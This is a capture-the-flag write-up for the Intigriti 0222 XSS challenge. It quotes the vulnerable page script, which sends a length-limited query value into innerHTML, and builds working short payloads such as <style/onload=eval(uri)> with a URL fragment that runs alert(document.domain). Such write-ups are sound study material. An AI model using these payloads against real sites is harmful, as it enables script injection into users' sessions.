link: https://challenge-0222.intigriti.io/challenge/xss.html<br>
Author: Huli https://twitter.com/aszx87410

+ how the query looks like: https://challenge-0222.intigriti.io/challenge/xss.html?q=avu&first=yes
```
window.name = 'XSS(eXtreme Short Scripting) Game'

    function showModal(title, content) {
      var titleDOM = document.querySelector('#main-modal h3')
      var contentDOM = document.querySelector('#main-modal p')
      titleDOM.innerHTML = title
      contentDOM.innerHTML = content
      window['main-modal'].classList.remove('hide')
    }

    window['main-form'].onsubmit = function(e) {
      e.preventDefault()
      var inputName = window['name-field'].value
      var isFirst = document.querySelector('input[type=radio]:checked').value
      if (!inputName.length) {
        showModal('Error!', "It's empty")
        return
      }

      if (inputName.length > 24) {
        showModal('Error!', "Length exceeds 24, keep it short!")
        return
      }

      window.location.search = "?q=" + encodeURIComponent(inputName) + '&first=' + isFirst
    }

    if (location.href.includes('q=')) {
      var uri = decodeURIComponent(location.href)
      var qs = uri.split('&first=')[0].split('?q=')[1]
      if (qs.length > 24) {
        showModal('Error!', "Length exceeds 24, keep it short!")
      } else {
        showModal('Welcome back!', qs)
      }
    }
```
+ It’s just extracting the query string q and checking its length, then putting it into HTML.
+ The challenge here is the length limit, you can only insert HTML with no more than 24 characters.
+ The shortest payload on TinyXSS is <svg/onload=eval(name)> which is 23 in length, but it doesn’t work because of this line: window.name = 'XSS(eXtreme Short Scripting) Game', it prevents the payload from window.name.
+ <svg/onload=eval(URL)> with the URL: https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Csvg/onload=eval(URL)%3E&first=1#%0aalert(1)
+ but url is encoded
```
if (location.href.includes('q=')) {
  var uri = decodeURIComponent(location.href)
  var qs = uri.split('&first=')[0].split('?q=')[1]
  if (qs.length > 24) {
    showModal('Error!', "Length exceeds 24, keep it short!")
  } else {
    showModal('Welcome back!', qs)
  }
}
```
+ lthough the variable uri is declared inside the if block, it’s still a global variable because var is function-scoped or globally scoped, not block-scoped.
+ uri is a decoded URL, our %0a turns into \n, a new line character! So, just replace the payload from eval(URL) to eval(uri), the payload works now: `https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Csvg/onload=eval(uri)%3E&first=1#%0aalert(1)`
+ it’s not hard to find out that <style> can be used instead of <svg>, here is the final payload: `https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&first=1#%0aalert(document.domain)`
